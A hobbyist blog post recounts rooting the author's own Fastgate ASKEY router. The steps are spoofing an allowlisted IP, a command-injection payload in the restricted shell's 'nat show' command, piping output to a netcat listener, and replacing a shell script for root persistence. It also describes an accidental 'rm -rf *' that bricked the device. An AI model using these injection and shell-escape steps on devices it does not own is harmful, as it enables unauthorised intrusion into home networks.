Gaining Root on the ASKEY RTV1907VW-D228 Fastgate

May 21, 2026

Archive

This is an old project from 31 December 2020 the text has been written recently.

Consumer devices often come with locked-down firmware, analyzing them provides excellent opportunities to understand embedded security. As my ISP recently upgraded my Internet connection to FTTC and gave me a new router, I decided to explore more the old Askey RT1907VW, one of the Fastgate router models from Fastweb. An SQL-injection vulnerability in the login webpage had been previously documented, but it now appeared patched in the latest release, requiring an alternative approach.

A fake IP address

Since I didn't have the hardware for serial access, I decided to try with Ethernet ports, starting with a nmap scan. SSH access was available out of the box, unluckily, port 22 was filtered to only permit connections from specific IP addresses, probably Fastweb's subnets. I found the full list of permitted IP addresses thanks to someone who got into the router via serial access on a previous firmware (available here). I so set up a DHCP server with one of these IP addresses. I so utilized a Raspberry Pi 3B, configured a DHCP server, and connected it directly to the router's WAN port.

A custom Shell?

Once established an SSH connection (using credentials documented in the aforementioned POUL presentation), I encountered a restricted custom shell. Standard Bash commands (ls, cat, cp, etc.) were unavailable. Executing help returned a list of permitted utilities, which I explored one by one. One command, nat show, stood out.

According to the internal help menu, this command allowed filtering output through an expression. Suspecting a potential lack of input sanitization, I tested for command injection using:

nat show $(/bin/sh)

The command executed without standard output, but it did return Bash errors, confirming the injection vulnerability.
I was in the shell!

Let's see

A blind shell presents specific challenges. Luckily, the netcat package was installed in the system, so I could utilize nc to redirect the output to another device. On my Raspberry Pi, I opened a second terminal window and set up a listening port:

nc -lvvp 8082

Back in the router's blind shell, I simply appended | nc 8082 to every command I typed. My RaspBerry terminal lit up with the responses. I finally had eyes on the system.

Full shell access

The filesystem was mounted as read-only. After enabling read/write access (again, utilizing techniques from the POUL presentation), I sought a method to establish persistence. The permitted shell commands were implemented as Bash scripts, so I selected what it was, in my opinion, the least useful one: /usr/sbin/stshell/ntp.sh.

Using a mounted USB drive, I transferred the script to my laptop, replaced its core logic with a straightforward /bin/sh -l command, and backed up the original file on the router. After swapping in the modified script, I restarted the SSH session and executed ntp show. Because the restricted environment was already operating with high privileges, bypassing it immediately dropped me into a Linux shell as root user.

The end...?

Running on firmware 0.00.89, I managed to permanently unlock SSH across the local LAN (192.168.*.*) changing the iptables rules; although, for some reason, it required an Ethernet cable connected to the WAN port after boot to actually open the port SSH port.

Aiming to a more user-friendly system, I exported the binary paths to avoid typing full directories for the statusapi tools. However, during a clean-up phase, an improperly scoped command (rm -rf * executed in the wrong directory) inadvertently corrupted the filesystem, bricking the device. Recovery mode via the HTTP port is currently inaccessible.

Takeaways

While the hardware is older and currently non-functional, this project successfully demonstrated how to bypass network filtering and chain a command injection vulnerability with shell exfiltration to escape a restricted environment. Furthermore, the accidental system corruption serves as a strong reminder of the critical importance of environment isolation and strict command validation when operating with elevated privileges.
